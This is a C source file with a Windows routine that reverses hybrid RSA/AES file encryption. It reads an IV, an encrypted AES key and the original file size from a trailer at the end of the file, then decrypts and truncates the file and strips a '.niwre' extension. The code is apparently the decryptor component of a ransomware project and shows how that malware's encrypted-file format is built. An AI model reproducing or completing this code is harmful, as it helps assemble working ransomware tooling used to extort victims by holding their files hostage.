#include "decrypt.h"
#include "utils.h"

BOOL DecryptWholeFileW(const WCHAR* szFileName)
{
    BOOL bResult = FALSE;

	PBYTE pbDecryptedAESKey = NULL;
	DWORD dwDecryptedAESKeyLen = 0;

	PBYTE pbCiphertextFileData = NULL;
	DWORD dwCiphertextFileDataLen = 0;

	PBYTE pbDecryptedFileData = NULL;
	DWORD dwDecryptedFileDataLen = 0;

    BYTE pbKey[16] = {0}; // 128 bit key
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[16] = {0};
	DWORD dwIVLen = sizeof(pbIV);

	HANDLE hFile = NULL;

    //
	// Read the whole file from disk to memory or only 4KB if the file is too big
	//
	bResult = ReadFileWToByteArray(szFileName, &pbCiphertextFileData, &dwCiphertextFileDataLen);
	if( !bResult )
	{
		goto Exit;
	}

    hFile = CreateFileW(
		szFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS, // If the file exists it will be opened, if it doesn't exist it will be created
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if( !hFile || hFile == INVALID_HANDLE_VALUE )
	{
		bResult = FALSE;
		bResult = FALSE;
		WCHAR szError[MAX_PATH] = {0};
		_itowOwn(GetLastError(), szError, 10);
		_StringCchCatW(szError, MAX_PATH, L" CreateFileW failed! (DecryptWholeFileW)\n");
		writeToConsoleW(szError);
		goto Exit;
	}

    LARGE_INTEGER liDistance;
	liDistance.QuadPart = -280LL; // sizeof(IV) + sizeof(encrypted AES key) + sizeof(original file size)
    bResult = SetFilePointerEx(hFile, liDistance, NULL, FILE_END);
	if(!bResult) // Move file pointer to the end of the file
	{
		goto Exit;
	}

    BYTE encryptedAESKey[256];
    DWORD dwencryptedAESKeyLen = sizeof(encryptedAESKey);
    ULONG64 originalFileSize;
    DWORD bytesRead;

    bResult = ReadFile(hFile, pbIV, dwIVLen, &bytesRead, NULL);
    if (!bResult || bytesRead != dwIVLen)
    {
        goto Exit;
    }

    bResult = ReadFile(hFile, encryptedAESKey, dwencryptedAESKeyLen, &bytesRead, NULL);

    if (!bResult || bytesRead != dwencryptedAESKeyLen) 
    {
        goto Exit;
    }

    bResult = ReadFile(hFile, &originalFileSize, sizeof(originalFileSize), &bytesRead, NULL);

    if (!bResult || bytesRead != sizeof(originalFileSize)) 
    {
        goto Exit;
    }

    //
	// Decrypt the AES key first.
	//
	bResult = RSADecrypt(
		encryptedAESKey,
		dwencryptedAESKeyLen,
		&pbDecryptedAESKey,
		&dwDecryptedAESKeyLen
	);

	if( !bResult )
	{
		writeToConsoleW(L"RSADecrypt failed\n");
		goto Exit;
	}

    my_memcpy(pbKey, pbDecryptedAESKey, dwKeyLen); // Copy the decrypted AES key to the AES key buffer
    //
	// Decrypt the actual file
	//
	bResult = AESDecrypt(
		pbCiphertextFileData,
		dwCiphertextFileDataLen,
		pbKey,
		dwKeyLen,
		pbIV,
		dwIVLen,
		&pbDecryptedFileData,
		&dwDecryptedFileDataLen
	);

	RtlSecureZeroMemory(pbKey, dwKeyLen); // Clear the AES key from memory

	if( !bResult )
	{
		writeToConsoleW(L"AESDecrypt failed\n");
		goto Exit;
	}

    liDistance.QuadPart = 0;
    bResult = SetFilePointerEx(hFile, liDistance, NULL, FILE_BEGIN);
	if(!bResult) // Move file pointer to the start of the file
	{
		goto Exit;
	}
    
	DWORD dwWritten = 0;
	bResult = WriteFile( hFile, pbDecryptedFileData, dwDecryptedFileDataLen, &dwWritten, NULL); // Write the decrypted file data

    if( !bResult || dwWritten != dwDecryptedFileDataLen )
    {
        goto Exit;
    }

	// Move the file pointer to the original file size position
    liDistance.QuadPart = originalFileSize;
    bResult = SetFilePointerEx(hFile, liDistance, NULL, FILE_BEGIN);
    if (!bResult)
    {
        goto Exit;
    }

    bResult = SetEndOfFile(hFile); // Truncate the file to the original size

    if(!bResult)
    {
        goto Exit;
    }

Exit:
	if( hFile )
		CloseHandle( hFile );

	if( pbDecryptedAESKey )
		HeapFree(GetProcessHeap(), 0, pbDecryptedAESKey);

	if( pbCiphertextFileData )
		VirtualFree(pbCiphertextFileData, 0, MEM_RELEASE);

	if( pbDecryptedFileData )
		VirtualFree(pbDecryptedFileData, 0, MEM_RELEASE);

    //
	// Remove extension from a file
	//
	if(bResult)
	{
		if(_wcslen(szFileName) + _wcslen(L".niwre") < MAX_PATH) // Check if the new path will not exceed the MAX_PATH limit (260 characters)
		{
			WCHAR szNewPath[MAX_PATH] = {0};
			_wcscpy_s(szNewPath, MAX_PATH, szFileName);
			// Remove .niwre extension from the file
			PathRemoveExtensionW(szNewPath);
			MoveFileW(szFileName, szNewPath);
		}
		else
		{
			size_t dwNewPathLen = _wcslen(szFileName) + _wcslen(L".niwre") + 1;
			WCHAR* szNewPath = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewPathLen * sizeof(WCHAR));
			if(szNewPath)
			{
				_wcscpy_s(szNewPath, dwNewPathLen, szFileName);
				// Remove .niwre extension from the file
				PathRemoveExtensionW(szNewPath);
				MoveFileW(szFileName, szNewPath);
				HeapFree(GetProcessHeap(), 0, szNewPath);
			}
		}
	}

	return bResult;
}